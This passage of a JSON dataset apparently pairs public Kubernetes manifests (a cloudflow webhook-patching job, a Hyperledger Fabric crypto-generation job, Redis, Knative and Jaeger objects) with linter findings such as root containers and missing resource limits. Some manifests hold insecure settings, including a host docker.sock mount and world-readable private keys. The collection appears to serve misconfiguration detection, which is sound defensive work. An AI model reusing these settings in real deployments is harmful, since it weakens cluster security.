\\      \\\"uid\\\": \\\"$UUID\\\"\\n      }\\n    ]\\n  }\\n}\\nEOF\\n)\\necho $JSON\\n\\\n          kubectl patch MutatingWebhookConfiguration $HOOK_NAME -n cloudflow -p \\\"\\\n          $JSON\\\"\"\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"main\" does not have a read-only root file system"
  },
  {
    "id": "2574",
    "manifest_path": "data/manifests/the_stack_sample/sample_0690.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cloudflow-patch-spark-mutatingwebhookconfig\nspec:\n  template:\n    spec:\n      serviceAccountName: cloudflow-operator\n      containers:\n      - name: main\n        image: alpine:3.12\n        command:\n        - /bin/ash\n        - -c\n        - \"apk update && apk add wget\\nwget -q -O /bin/kubectl https://storage.googleapis.com/kubernetes-release/release/v1.16.12/bin/linux/amd64/kubectl\\\n          \\ && chmod 755 /bin/kubectl\\nNAME=\\\"spark-operator-sparkoperator\\\"\\nAPI_VERSION=$(kubectl\\\n          \\ get deployment -n cloudflow $NAME -o jsonpath='{.apiVersion}')\\nUUID=$(kubectl\\\n          \\ get deployment -n cloudflow $NAME -o jsonpath='{.metadata.uid}')\\nKIND=$(kubectl\\\n          \\ get deployment -n cloudflow $NAME -o jsonpath='{.kind}')\\nHOOK_NAME=\\\"\\\n          spark-operator-sparkoperator-webhook-config\\\"\\nJSON=$(cat <<EOF\\n{\\n  \\\"\\\n          metadata\\\": {\\n    \\\"ownerReferences\\\": [\\n      {\\n        \\\"apiVersion\\\"\\\n          : \\\"$API_VERSION\\\",\\n        \\\"blockOwnerDeletion\\\": true,\\n        \\\"controller\\\"\\\n          : true,\\n        \\\"kind\\\": \\\"$KIND\\\",\\n        \\\"name\\\": \\\"$NAME\\\",\\n  \\\n          \\      \\\"uid\\\": \\\"$UUID\\\"\\n      }\\n    ]\\n  }\\n}\\nEOF\\n)\\necho $JSON\\n\\\n          kubectl patch MutatingWebhookConfiguration $HOOK_NAME -n cloudflow -p \\\"\\\n          $JSON\\\"\"\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"cloudflow-operator\" not found"
  },
  {
    "id": "2575",
    "manifest_path": "data/manifests/the_stack_sample/sample_0690.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cloudflow-patch-spark-mutatingwebhookconfig\nspec:\n  template:\n    spec:\n      serviceAccountName: cloudflow-operator\n      containers:\n      - name: main\n        image: alpine:3.12\n        command:\n        - /bin/ash\n        - -c\n        - \"apk update && apk add wget\\nwget -q -O /bin/kubectl https://storage.googleapis.com/kubernetes-release/release/v1.16.12/bin/linux/amd64/kubectl\\\n          \\ && chmod 755 /bin/kubectl\\nNAME=\\\"spark-operator-sparkoperator\\\"\\nAPI_VERSION=$(kubectl\\\n          \\ get deployment -n cloudflow $NAME -o jsonpath='{.apiVersion}')\\nUUID=$(kubectl\\\n          \\ get deployment -n cloudflow $NAME -o jsonpath='{.metadata.uid}')\\nKIND=$(kubectl\\\n          \\ get deployment -n cloudflow $NAME -o jsonpath='{.kind}')\\nHOOK_NAME=\\\"\\\n          spark-operator-sparkoperator-webhook-config\\\"\\nJSON=$(cat <<EOF\\n{\\n  \\\"\\\n          metadata\\\": {\\n    \\\"ownerReferences\\\": [\\n      {\\n        \\\"apiVersion\\\"\\\n          : \\\"$API_VERSION\\\",\\n        \\\"blockOwnerDeletion\\\": true,\\n        \\\"controller\\\"\\\n          : true,\\n        \\\"kind\\\": \\\"$KIND\\\",\\n        \\\"name\\\": \\\"$NAME\\\",\\n  \\\n          \\      \\\"uid\\\": \\\"$UUID\\\"\\n      }\\n    ]\\n  }\\n}\\nEOF\\n)\\necho $JSON\\n\\\n          kubectl patch MutatingWebhookConfiguration $HOOK_NAME -n cloudflow -p \\\"\\\n          $JSON\\\"\"\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"main\" is not set to runAsNonRoot"
  },
  {
    "id": "2576",
    "manifest_path": "data/manifests/the_stack_sample/sample_0690.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cloudflow-patch-spark-mutatingwebhookconfig\nspec:\n  template:\n    spec:\n      serviceAccountName: cloudflow-operator\n      containers:\n      - name: main\n        image: alpine:3.12\n        command:\n        - /bin/ash\n        - -c\n        - \"apk update && apk add wget\\nwget -q -O /bin/kubectl https://storage.googleapis.com/kubernetes-release/release/v1.16.12/bin/linux/amd64/kubectl\\\n          \\ && chmod 755 /bin/kubectl\\nNAME=\\\"spark-operator-sparkoperator\\\"\\nAPI_VERSION=$(kubectl\\\n          \\ get deployment -n cloudflow $NAME -o jsonpath='{.apiVersion}')\\nUUID=$(kubectl\\\n          \\ get deployment -n cloudflow $NAME -o jsonpath='{.metadata.uid}')\\nKIND=$(kubectl\\\n          \\ get deployment -n cloudflow $NAME -o jsonpath='{.kind}')\\nHOOK_NAME=\\\"\\\n          spark-operator-sparkoperator-webhook-config\\\"\\nJSON=$(cat <<EOF\\n{\\n  \\\"\\\n          metadata\\\": {\\n    \\\"ownerReferences\\\": [\\n      {\\n        \\\"apiVersion\\\"\\\n          : \\\"$API_VERSION\\\",\\n        \\\"blockOwnerDeletion\\\": true,\\n        \\\"controller\\\"\\\n          : true,\\n        \\\"kind\\\": \\\"$KIND\\\",\\n        \\\"name\\\": \\\"$NAME\\\",\\n  \\\n          \\      \\\"uid\\\": \\\"$UUID\\\"\\n      }\\n    ]\\n  }\\n}\\nEOF\\n)\\necho $JSON\\n\\\n          kubectl patch MutatingWebhookConfiguration $HOOK_NAME -n cloudflow -p \\\"\\\n          $JSON\\\"\"\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"main\" has cpu request 0"
  },
  {
    "id": "2577",
    "manifest_path": "data/manifests/the_stack_sample/sample_0690.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cloudflow-patch-spark-mutatingwebhookconfig\nspec:\n  template:\n    spec:\n      serviceAccountName: cloudflow-operator\n      containers:\n      - name: main\n        image: alpine:3.12\n        command:\n        - /bin/ash\n        - -c\n        - \"apk update && apk add wget\\nwget -q -O /bin/kubectl https://storage.googleapis.com/kubernetes-release/release/v1.16.12/bin/linux/amd64/kubectl\\\n          \\ && chmod 755 /bin/kubectl\\nNAME=\\\"spark-operator-sparkoperator\\\"\\nAPI_VERSION=$(kubectl\\\n          \\ get deployment -n cloudflow $NAME -o jsonpath='{.apiVersion}')\\nUUID=$(kubectl\\\n          \\ get deployment -n cloudflow $NAME -o jsonpath='{.metadata.uid}')\\nKIND=$(kubectl\\\n          \\ get deployment -n cloudflow $NAME -o jsonpath='{.kind}')\\nHOOK_NAME=\\\"\\\n          spark-operator-sparkoperator-webhook-config\\\"\\nJSON=$(cat <<EOF\\n{\\n  \\\"\\\n          metadata\\\": {\\n    \\\"ownerReferences\\\": [\\n      {\\n        \\\"apiVersion\\\"\\\n          : \\\"$API_VERSION\\\",\\n        \\\"blockOwnerDeletion\\\": true,\\n        \\\"controller\\\"\\\n          : true,\\n        \\\"kind\\\": \\\"$KIND\\\",\\n        \\\"name\\\": \\\"$NAME\\\",\\n  \\\n          \\      \\\"uid\\\": \\\"$UUID\\\"\\n      }\\n    ]\\n  }\\n}\\nEOF\\n)\\necho $JSON\\n\\\n          kubectl patch MutatingWebhookConfiguration $HOOK_NAME -n cloudflow -p \\\"\\\n          $JSON\\\"\"\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"main\" has memory limit 0"
  },
  {
    "id": "2578",
    "manifest_path": "data/manifests/the_stack_sample/sample_0691.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: divide\n  namespace: <PROJECT>\n  labels:\n    app: divide\nspec:\n  ports:\n  - port: 8080\n    targetPort: 8080\n    name: http\n  selector:\n    app: divide\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:divide])"
  },
  {
    "id": "2579",
    "manifest_path": "data/manifests/the_stack_sample/sample_0693.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: utils\nspec:\n  template:\n    metadata:\n      name: utils\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n      containers:\n      - name: cryptogen\n        image: hyperledger/fabric-tools:1.3.0\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - echo 'Cryptogen Starts'; ls -l /shared/artifacts; while [ ! -d /shared/artifacts\n          ]; do echo Waiting for configFiles; sleep 1; done; cryptogen generate --config\n          /shared/artifacts/crypto-config.yaml && cp -r crypto-config /shared/ &&\n          for file in $(find /shared/ -iname *_sk); do echo $file; dir=$(dirname $file);\n          echo ${dir}; mv ${dir}/*_sk ${dir}/key.pem; done && find /shared -type d\n          | xargs chmod a+rx && find /shared -type f | xargs chmod a+r && touch /shared/status_cryptogen_complete;\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: configtxgen\n        image: hyperledger/fabric-tools:1.3.0\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - echo 'Configtxgen Starts'; ls -l /shared; sleep 1 && while [ ! -f /shared/status_cryptogen_complete\n          ]; do echo Waiting for cryptogen; sleep 1; done; cp /shared/artifacts/configtx.yaml\n          /shared/; cd /shared/; export FABRIC_CFG_PATH=$PWD; configtxgen -profile\n          TwoOrgsOrdererGenesis -outputBlock genesis.block && find /shared -type d\n          | xargs chmod a+rx && find /shared -type f | xargs chmod a+r && touch /shared/status_configtxgen_complete\n          && rm /shared/status_cryptogen_complete;\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "2580",
    "manifest_path": "data/manifests/the_stack_sample/sample_0693.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: utils\nspec:\n  template:\n    metadata:\n      name: utils\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n      containers:\n      - name: cryptogen\n        image: hyperledger/fabric-tools:1.3.0\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - echo 'Cryptogen Starts'; ls -l /shared/artifacts; while [ ! -d /shared/artifacts\n          ]; do echo Waiting for configFiles; sleep 1; done; cryptogen generate --config\n          /shared/artifacts/crypto-config.yaml && cp -r crypto-config /shared/ &&\n          for file in $(find /shared/ -iname *_sk); do echo $file; dir=$(dirname $file);\n          echo ${dir}; mv ${dir}/*_sk ${dir}/key.pem; done && find /shared -type d\n          | xargs chmod a+rx && find /shared -type f | xargs chmod a+r && touch /shared/status_cryptogen_complete;\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: configtxgen\n        image: hyperledger/fabric-tools:1.3.0\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - echo 'Configtxgen Starts'; ls -l /shared; sleep 1 && while [ ! -f /shared/status_cryptogen_complete\n          ]; do echo Waiting for cryptogen; sleep 1; done; cp /shared/artifacts/configtx.yaml\n          /shared/; cd /shared/; export FABRIC_CFG_PATH=$PWD; configtxgen -profile\n          TwoOrgsOrdererGenesis -outputBlock genesis.block && find /shared -type d\n          | xargs chmod a+rx && find /shared -type f | xargs chmod a+r && touch /shared/status_configtxgen_complete\n          && rm /shared/status_cryptogen_complete;\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"configtxgen\" does not have a read-only root file system"
  },
  {
    "id": "2581",
    "manifest_path": "data/manifests/the_stack_sample/sample_0693.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: utils\nspec:\n  template:\n    metadata:\n      name: utils\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n      containers:\n      - name: cryptogen\n        image: hyperledger/fabric-tools:1.3.0\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - echo 'Cryptogen Starts'; ls -l /shared/artifacts; while [ ! -d /shared/artifacts\n          ]; do echo Waiting for configFiles; sleep 1; done; cryptogen generate --config\n          /shared/artifacts/crypto-config.yaml && cp -r crypto-config /shared/ &&\n          for file in $(find /shared/ -iname *_sk); do echo $file; dir=$(dirname $file);\n          echo ${dir}; mv ${dir}/*_sk ${dir}/key.pem; done && find /shared -type d\n          | xargs chmod a+rx && find /shared -type f | xargs chmod a+r && touch /shared/status_cryptogen_complete;\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: configtxgen\n        image: hyperledger/fabric-tools:1.3.0\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - echo 'Configtxgen Starts'; ls -l /shared; sleep 1 && while [ ! -f /shared/status_cryptogen_complete\n          ]; do echo Waiting for cryptogen; sleep 1; done; cp /shared/artifacts/configtx.yaml\n          /shared/; cd /shared/; export FABRIC_CFG_PATH=$PWD; configtxgen -profile\n          TwoOrgsOrdererGenesis -outputBlock genesis.block && find /shared -type d\n          | xargs chmod a+rx && find /shared -type f | xargs chmod a+r && touch /shared/status_configtxgen_complete\n          && rm /shared/status_cryptogen_complete;\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cryptogen\" does not have a read-only root file system"
  },
  {
    "id": "2582",
    "manifest_path": "data/manifests/the_stack_sample/sample_0693.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: utils\nspec:\n  template:\n    metadata:\n      name: utils\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n      containers:\n      - name: cryptogen\n        image: hyperledger/fabric-tools:1.3.0\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - echo 'Cryptogen Starts'; ls -l /shared/artifacts; while [ ! -d /shared/artifacts\n          ]; do echo Waiting for configFiles; sleep 1; done; cryptogen generate --config\n          /shared/artifacts/crypto-config.yaml && cp -r crypto-config /shared/ &&\n          for file in $(find /shared/ -iname *_sk); do echo $file; dir=$(dirname $file);\n          echo ${dir}; mv ${dir}/*_sk ${dir}/key.pem; done && find /shared -type d\n          | xargs chmod a+rx && find /shared -type f | xargs chmod a+r && touch /shared/status_cryptogen_complete;\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: configtxgen\n        image: hyperledger/fabric-tools:1.3.0\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - echo 'Configtxgen Starts'; ls -l /shared; sleep 1 && while [ ! -f /shared/status_cryptogen_complete\n          ]; do echo Waiting for cryptogen; sleep 1; done; cp /shared/artifacts/configtx.yaml\n          /shared/; cd /shared/; export FABRIC_CFG_PATH=$PWD; configtxgen -profile\n          TwoOrgsOrdererGenesis -outputBlock genesis.block && find /shared -type d\n          | xargs chmod a+rx && find /shared -type f | xargs chmod a+r && touch /shared/status_configtxgen_complete\n          && rm /shared/status_cryptogen_complete;\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"configtxgen\" is not set to runAsNonRoot"
  },
  {
    "id": "2583",
    "manifest_path": "data/manifests/the_stack_sample/sample_0693.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: utils\nspec:\n  template:\n    metadata:\n      name: utils\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n      containers:\n      - name: cryptogen\n        image: hyperledger/fabric-tools:1.3.0\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - echo 'Cryptogen Starts'; ls -l /shared/artifacts; while [ ! -d /shared/artifacts\n          ]; do echo Waiting for configFiles; sleep 1; done; cryptogen generate --config\n          /shared/artifacts/crypto-config.yaml && cp -r crypto-config /shared/ &&\n          for file in $(find /shared/ -iname *_sk); do echo $file; dir=$(dirname $file);\n          echo ${dir}; mv ${dir}/*_sk ${dir}/key.pem; done && find /shared -type d\n          | xargs chmod a+rx && find /shared -type f | xargs chmod a+r && touch /shared/status_cryptogen_complete;\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: configtxgen\n        image: hyperledger/fabric-tools:1.3.0\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - echo 'Configtxgen Starts'; ls -l /shared; sleep 1 && while [ ! -f /shared/status_cryptogen_complete\n          ]; do echo Waiting for cryptogen; sleep 1; done; cp /shared/artifacts/configtx.yaml\n          /shared/; cd /shared/; export FABRIC_CFG_PATH=$PWD; configtxgen -profile\n          TwoOrgsOrdererGenesis -outputBlock genesis.block && find /shared -type d\n          | xargs chmod a+rx && find /shared -type f | xargs chmod a+r && touch /shared/status_configtxgen_complete\n          && rm /shared/status_cryptogen_complete;\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cryptogen\" is not set to runAsNonRoot"
  },
  {
    "id": "2584",
    "manifest_path": "data/manifests/the_stack_sample/sample_0693.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: utils\nspec:\n  template:\n    metadata:\n      name: utils\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n      containers:\n      - name: cryptogen\n        image: hyperledger/fabric-tools:1.3.0\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - echo 'Cryptogen Starts'; ls -l /shared/artifacts; while [ ! -d /shared/artifacts\n          ]; do echo Waiting for configFiles; sleep 1; done; cryptogen generate --config\n          /shared/artifacts/crypto-config.yaml && cp -r crypto-config /shared/ &&\n          for file in $(find /shared/ -iname *_sk); do echo $file; dir=$(dirname $file);\n          echo ${dir}; mv ${dir}/*_sk ${dir}/key.pem; done && find /shared -type d\n          | xargs chmod a+rx && find /shared -type f | xargs chmod a+r && touch /shared/status_cryptogen_complete;\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: configtxgen\n        image: hyperledger/fabric-tools:1.3.0\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - echo 'Configtxgen Starts'; ls -l /shared; sleep 1 && while [ ! -f /shared/status_cryptogen_complete\n          ]; do echo Waiting for cryptogen; sleep 1; done; cp /shared/artifacts/configtx.yaml\n          /shared/; cd /shared/; export FABRIC_CFG_PATH=$PWD; configtxgen -profile\n          TwoOrgsOrdererGenesis -outputBlock genesis.block && find /shared -type d\n          | xargs chmod a+rx && find /shared -type f | xargs chmod a+r && touch /shared/status_configtxgen_complete\n          && rm /shared/status_cryptogen_complete;\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"configtxgen\" has cpu request 0"
  },
  {
    "id": "2585",
    "manifest_path": "data/manifests/the_stack_sample/sample_0693.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: utils\nspec:\n  template:\n    metadata:\n      name: utils\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n      containers:\n      - name: cryptogen\n        image: hyperledger/fabric-tools:1.3.0\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - echo 'Cryptogen Starts'; ls -l /shared/artifacts; while [ ! -d /shared/artifacts\n          ]; do echo Waiting for configFiles; sleep 1; done; cryptogen generate --config\n          /shared/artifacts/crypto-config.yaml && cp -r crypto-config /shared/ &&\n          for file in $(find /shared/ -iname *_sk); do echo $file; dir=$(dirname $file);\n          echo ${dir}; mv ${dir}/*_sk ${dir}/key.pem; done && find /shared -type d\n          | xargs chmod a+rx && find /shared -type f | xargs chmod a+r && touch /shared/status_cryptogen_complete;\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: configtxgen\n        image: hyperledger/fabric-tools:1.3.0\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - echo 'Configtxgen Starts'; ls -l /shared; sleep 1 && while [ ! -f /shared/status_cryptogen_complete\n          ]; do echo Waiting for cryptogen; sleep 1; done; cp /shared/artifacts/configtx.yaml\n          /shared/; cd /shared/; export FABRIC_CFG_PATH=$PWD; configtxgen -profile\n          TwoOrgsOrdererGenesis -outputBlock genesis.block && find /shared -type d\n          | xargs chmod a+rx && find /shared -type f | xargs chmod a+r && touch /shared/status_configtxgen_complete\n          && rm /shared/status_cryptogen_complete;\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cryptogen\" has cpu request 0"
  },
  {
    "id": "2586",
    "manifest_path": "data/manifests/the_stack_sample/sample_0693.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: utils\nspec:\n  template:\n    metadata:\n      name: utils\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n      containers:\n      - name: cryptogen\n        image: hyperledger/fabric-tools:1.3.0\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - echo 'Cryptogen Starts'; ls -l /shared/artifacts; while [ ! -d /shared/artifacts\n          ]; do echo Waiting for configFiles; sleep 1; done; cryptogen generate --config\n          /shared/artifacts/crypto-config.yaml && cp -r crypto-config /shared/ &&\n          for file in $(find /shared/ -iname *_sk); do echo $file; dir=$(dirname $file);\n          echo ${dir}; mv ${dir}/*_sk ${dir}/key.pem; done && find /shared -type d\n          | xargs chmod a+rx && find /shared -type f | xargs chmod a+r && touch /shared/status_cryptogen_complete;\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: configtxgen\n        image: hyperledger/fabric-tools:1.3.0\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - echo 'Configtxgen Starts'; ls -l /shared; sleep 1 && while [ ! -f /shared/status_cryptogen_complete\n          ]; do echo Waiting for cryptogen; sleep 1; done; cp /shared/artifacts/configtx.yaml\n          /shared/; cd /shared/; export FABRIC_CFG_PATH=$PWD; configtxgen -profile\n          TwoOrgsOrdererGenesis -outputBlock genesis.block && find /shared -type d\n          | xargs chmod a+rx && find /shared -type f | xargs chmod a+r && touch /shared/status_configtxgen_complete\n          && rm /shared/status_cryptogen_complete;\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"configtxgen\" has memory limit 0"
  },
  {
    "id": "2587",
    "manifest_path": "data/manifests/the_stack_sample/sample_0693.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: utils\nspec:\n  template:\n    metadata:\n      name: utils\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n      containers:\n      - name: cryptogen\n        image: hyperledger/fabric-tools:1.3.0\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - echo 'Cryptogen Starts'; ls -l /shared/artifacts; while [ ! -d /shared/artifacts\n          ]; do echo Waiting for configFiles; sleep 1; done; cryptogen generate --config\n          /shared/artifacts/crypto-config.yaml && cp -r crypto-config /shared/ &&\n          for file in $(find /shared/ -iname *_sk); do echo $file; dir=$(dirname $file);\n          echo ${dir}; mv ${dir}/*_sk ${dir}/key.pem; done && find /shared -type d\n          | xargs chmod a+rx && find /shared -type f | xargs chmod a+r && touch /shared/status_cryptogen_complete;\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: configtxgen\n        image: hyperledger/fabric-tools:1.3.0\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - echo 'Configtxgen Starts'; ls -l /shared; sleep 1 && while [ ! -f /shared/status_cryptogen_complete\n          ]; do echo Waiting for cryptogen; sleep 1; done; cp /shared/artifacts/configtx.yaml\n          /shared/; cd /shared/; export FABRIC_CFG_PATH=$PWD; configtxgen -profile\n          TwoOrgsOrdererGenesis -outputBlock genesis.block && find /shared -type d\n          | xargs chmod a+rx && find /shared -type f | xargs chmod a+r && touch /shared/status_configtxgen_complete\n          && rm /shared/status_cryptogen_complete;\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cryptogen\" has memory limit 0"
  },
  {
    "id": "2588",
    "manifest_path": "data/manifests/the_stack_sample/sample_0694.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: redis-endpoint\nspec:\n  selector:\n    app: redis\n  ports:\n  - name: service\n    port: 6379\n    targetPort: 6379\n    protocol: TCP\n  - name: cluster\n    port: 16379\n    targetPort: 16379\n    protocol: TCP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:redis])"
  },
  {
    "id": "2589",
    "manifest_path": "data/manifests/the_stack_sample/sample_0696.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    role: webhook\n    security.knative.dev/release: devel\n  name: webhook\n  namespace: knative-security\nspec:\n  ports:\n  - port: 443\n    targetPort: 8443\n  selector:\n    role: webhook\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[role:webhook])"
  },
  {
    "id": "2590",
    "manifest_path": "data/manifests/the_stack_sample/sample_0697.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jaeger-operator\n  labels:\n    app: jaeger-operator-app\n  namespace: K8s-Tracing-Namespace\n  annotations:\n    developer/name: \"Mislav Jak\\u0161i\\u0107\"\n    developer/email: jaksicmislav@gmail.com\n    developer/url: https://github.com/MislavJaksic\n    developer/role: technical lead\n    developer/timezone: Europe/Zagreb\n    developer/picUrl: https://images.app.goo.gl/PCHZgd8oattge1i96\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: jaeger-operator\n  template:\n    metadata:\n      labels:\n        name: jaeger-operator\n    spec:\n      serviceAccountName: jaeger-operator\n      containers:\n      - name: jaeger-operator\n        image: jaegertracing/jaeger-operator:1.16.0\n        ports:\n        - containerPort: 8383\n          name: metrics\n        args:\n        - start\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: jaeger-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jaeger-operator\" does not have a read-only root file system"
  },
  {
    "id": "2591",
    "manifest_path": "data/manifests/the_stack_sample/sample_0697.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jaeger-operator\n  labels:\n    app: jaeger-operator-app\n  namespace: K8s-Tracing-Namespace\n  annotations:\n    developer/name: \"Mislav Jak\\u0161i\\u0107\"\n    developer/email: jaksicmislav@gmail.com\n    developer/url: https://github.com/MislavJaksic\n    developer/role: technical lead\n    developer/timezone: Europe/Zagreb\n    developer/picUrl: https://images.app.goo.gl/PCHZgd8oattge1i96\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: jaeger-operator\n  template:\n    metadata:\n      labels:\n        name: jaeger-operator\n    spec:\n      serviceAccountName: jaeger-operator\n      containers:\n      - name: jaeger-operator\n        image: jaegertracing/jaeger-operator:1.16.0\n        ports:\n        - containerPort: 8383\n          name: metrics\n        args:\n        - start\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: jaeger-operator\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jaeger-operator\" not found"
  },
  {
    "id": "2592",
    "manifest_path": "data/manifests/the_stack_sample/sample_0697.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jaeger-operator\n  labels:\n    app: jaeger-operator-app\n  namespace: K8s-Tracing-Namespace\n  annotations:\n    developer/name: \"Mislav Jak\\u0161i\\u0107\"\n    developer/email: jaksicmislav@gmail.com\n    developer/url: https://github.com/MislavJaksic\n    developer/role: technical lead\n    developer/timezone: Europe/Zagreb\n    developer/picUrl: https://images.app.goo.gl/PCHZgd8oattge1i96\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: jaeger-operator\n  template:\n    metadata:\n      labels:\n        name: jaeger-operator\n    spec:\n      serviceAccountName: jaeger-operator\n      containers:\n      - name: jaeger-operator\n        image: jaegertracing/jaeger-operator:1.16.0\n        ports:\n        - containerPort: 8383\n          name: metrics\n        args:\n        - start\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - 